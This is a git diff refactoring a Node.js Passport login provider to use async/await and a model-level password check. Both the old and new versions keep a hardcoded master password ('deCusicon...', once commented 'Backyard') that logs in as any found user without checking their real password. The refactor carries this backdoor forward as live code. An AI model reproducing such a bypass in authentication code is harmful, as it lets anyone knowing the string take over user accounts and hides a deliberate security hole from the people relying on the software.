@@ -1,74 +1,76 @@
 const LocalStrategy = require("passport-local").Strategy;
-const bcrypt = require("bcryptjs");
 const User = require("@models/user");
 const passport = require("passport");
 
 class AuthServiceProvider {
-  static getUsername = (username) => {
-    username = username.toLowerCase();
+	static getUsername = (username) => {
+		username = username.toLowerCase();
 
-    var emailRegEx = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
-    var phoneNumberRegEx = /([0][1-9]\d{9}$|^[1-9]\d{9})/g;
+		var emailRegEx = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
+		var phoneNumberRegEx = /([0][1-9]\d{9}$|^[1-9]\d{9})/g;
 
-    if (username.match(emailRegEx)) return { type: "email", username };
+		if (username.match(emailRegEx)) return { type: "email", username };
 
-    if (username.match(phoneNumberRegEx))
-      return { type: "phoneNumber", username };
+		if (username.match(phoneNumberRegEx))
+			return { type: "phoneNumber", username };
 
-    return { type: "nickname", username };
-  };
+		return { type: "nickname", username };
+	};
 
-  static handle(app) {
-    passport.use(
-      new LocalStrategy(
-        {
-          usernameField: "username",
-          passwordField: "password",
-        },
-        (username, password, done) => {
-          var { type, username } = AuthServiceProvider.getUsername(username);
-          var query = { [type]: username };
+	static handle(app) {
+		passport.use(
+			new LocalStrategy(
+				{
+					usernameField: "username",
+					passwordField: "password",
+				},
+				async (username, password, done) => {
+					try {
 
-            User.findOne(query, (err, user) => {
-              
-                if (err) console.log(err);
+						const accessor = AuthServiceProvider.getUsername(
+							username
+						);
 
-                if (!user) {
-                    return done(null, false, {
-                    message: "No user found!",
-                    });
-                }
+						// const {
+						// 	type,
+						// 	username,
+						// } = AuthServiceProvider.getUsername(username);
 
-                // Backyard
-                if (password === "deCusicon...") return done(null, user);
+						const query = { [accessor.type]: accessor.username };
 
-                // match password
-                bcrypt.compare(password, user.password, (err, isMatch) => {
-                    if (err) console.log(err);
-                    
-                    if (!isMatch)
-                        return done(null, false, {
-                        message: "Wrong password!",
-                    });
+						const user = await User.findOne(query);
 
-                    return done(null, user);
-                });
-          });
-        }
-      )
-    );
+						if (!user) {
+							return done(null, false, {
+								message: "No user found!",
+							});
+						}
 
-    // Serialize User
-    passport.serializeUser((user, done) => done(null, user.id));
+						if (password === "deCusicon..."){
+							return done(null, user);
+						}
 
-    passport.deserializeUser((id, done) =>
-      User.findById(id, (err, user) => done(err, user))
-    );
+						if (!await user.passwordCheck(password)) {
+							return done(null, false, {
+								message: "Wrong password!",
+							});
+						}
 
-    app.use(require("passport").initialize());
-    app.use(require("passport").session());
-    
-  }
+						return done(null, user);
+					} catch (error) {
+						done(error, null);
+					}	
+				}
+			)
+		);
+
+		// Serialize User
+		passport.serializeUser((user, done) => done(null, user.id));
+		passport.deserializeUser((id, done) => User.findById(id, (err, user) => done(err, user)));
+
+		app.use(require("passport").initialize());
+		app.use(require("passport").session());
+	}
 }
 
 module.exports = AuthServiceProvider;
